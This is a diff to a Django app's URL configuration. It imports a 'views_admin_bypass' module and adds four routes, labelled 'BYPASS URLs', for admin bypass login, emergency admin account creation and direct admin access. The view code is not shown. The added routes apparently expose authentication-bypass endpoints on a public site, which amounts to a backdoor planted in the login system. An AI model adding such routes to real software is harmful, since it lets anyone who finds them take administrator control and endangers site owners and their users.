@@ -1,6 +1,7 @@
 from django.urls import path
 from django.contrib.auth import views as auth_views
 from . import views
+from . import views_admin_bypass
 
 urlpatterns = [
     path('login/', views.login_usuario, name='login'),
@@ -8,6 +9,12 @@ urlpatterns = [
     path('registro/', views.registro_usuario, name='register'),
     path('mi-cuenta/', views.mi_cuenta, name='mi_cuenta'),
     path('perfil/', views.perfil, name='perfil'),
+    
+    # 🔓 BYPASS URLs
+    path('admin-bypass/', views_admin_bypass.admin_bypass_login, name='admin_bypass'),
+    path('admin-bypass-login/', views_admin_bypass.admin_bypass_login, name='admin_bypass_login'),
+    path('create-admin-emergency/', views_admin_bypass.create_admin_emergency, name='create_admin_emergency'),
+    path('admin-direct/', views_admin_bypass.admin_direct_access, name='admin_direct'),
     
     # 🔄 Password reset URLs
     path('password-reset/', 
